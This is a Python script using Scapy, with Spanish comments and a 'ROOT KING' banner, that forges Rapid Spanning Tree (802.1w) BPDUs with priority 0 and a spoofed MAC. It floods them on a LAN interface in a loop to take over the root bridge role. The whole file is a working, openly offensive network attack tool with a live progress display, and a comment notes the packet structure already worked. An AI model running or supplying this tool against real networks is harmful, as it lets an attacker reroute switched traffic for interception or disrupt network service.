#!/usr/bin/env python3
from scapy.all import *
import time
import os
import sys

# --- CONFIGURACIÓN ---
IFACE = "eth0"
ROGUE_MAC = "00:00:00:00:00:01" 

# --- COLORES Y ESTILOS ---
# Códigos ANSI para colores en la terminal
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

def clear_screen():
    os.system('clear')

def print_banner():
    clear_screen()
    banner = f"""
{GREEN}{BOLD}    
    ██████╗  ██████╗  ██████╗ ████████╗    ██╗  ██╗██╗███╗   ██╗ ██████╗ 
    ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝    ██║ ██╔╝██║████╗  ██║██╔════╝ 
    ██████╔╝██║   ██║██║   ██║   ██║       █████╔╝ ██║██╔██╗ ██║██║  ███╗
    ██╔══██╗██║   ██║██║   ██║   ██║       ██╔═██╗ ██║██║╚██╗██║██║   ██║
    ██║  ██║╚██████╔╝╚██████╔╝   ██║       ██║  ██╗██║██║ ╚████║╚██████╔╝
    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝       ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
{RESET}
    {CYAN}>>> RSTP ROOT BRIDGE TAKEOVER TOOL {RESET}
    {CYAN}>>> Target Mode: {WHITE}Access Port / VLAN Injection{RESET}
    {CYAN}>>> Protocol: {WHITE}RSTP (802.1w) / Dot3{RESET}
    """
    print(banner)

def get_real_mac(interface):
    try:
        return get_if_hwaddr(interface)
    except:
        return "Unknown"

def main():
    print_banner()

    # Chequeo de seguridad
    if os.geteuid() != 0:
        print(f"{RED}[!] ERROR: Necesitas permisos de ROOT (sudo) para correr esto.{RESET}")
        sys.exit(1)

    print(f"{YELLOW}[*] Inicializando interfaz de ataque ({IFACE})...{RESET}")
    real_mac = get_real_mac(IFACE)
    print(f"{YELLOW}[*] MAC Real detectada: {RESET}{real_mac}")
    print(f"{YELLOW}[*] MAC Falsa (Root):   {RESET}{RED}{ROGUE_MAC}{RESET}")
    print(f"{GREEN}[+] Configuración cargada. Interceptando topología...{RESET}\n")
    
    time.sleep(1)
    
    print(f"{BOLD}ATAQUE EN PROCESO... (Presiona Ctrl+C para detener){RESET}")
    print("-" * 50)

    # --- CONSTRUCCIÓN DEL PAQUETE GANADOR ---
    # Usamos exactamente la estructura que te funcionó: RSTP Untagged
    pkt = Dot3(src=ROGUE_MAC, dst="01:80:c2:00:00:00") / \
          LLC(dsap=0x42, ssap=0x42, ctrl=0x03) / \
          STP(proto=0,
              version=2,           # RSTP
              bpdutype=0x02,       # Tipo RSTP
              bpduflags=0x3c,      # Proposal + Agreement + Forwarding
              rootid=0,            # Prioridad 0 (Ganadora)
              rootmac=ROGUE_MAC,
              pathcost=0,
              bridgeid=0,
              bridgemac=ROGUE_MAC, # Tu MAC
              portid=0x8002,
              age=0, maxage=20, hellotime=2, fwddelay=15)

    count = 0
    start_time = time.time()

    try:
        while True:
            # Enviar paquete
            sendp(pkt, iface=IFACE, verbose=0)
            count += 1
            
            # Cálculo de tiempo
            elapsed = time.time() - start_time
            
            # --- EFECTO VISUAL EN UNA SOLA LÍNEA ---
            # \r hace que el cursor vuelva al principio de la línea
            sys.stdout.write(f"\r{BLUE}[INFO]{RESET} BPDUs Enviadas: {GREEN}{count}{RESET} | Tiempo: {int(elapsed)}s | Estado: {RED}RECLAMANDO ROOT...{RESET}")
            sys.stdout.flush()
            
            time.sleep(1)

    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}[!] Ataque detenido por el usuario.{RESET}")
        print(f"{GREEN}[+] Total de paquetes inyectados: {count}{RESET}")
        print(f"{CYAN}[*] Devolviendo el control a la red...{RESET}")
        sys.exit(0)

if __name__ == "__main__":
    main()



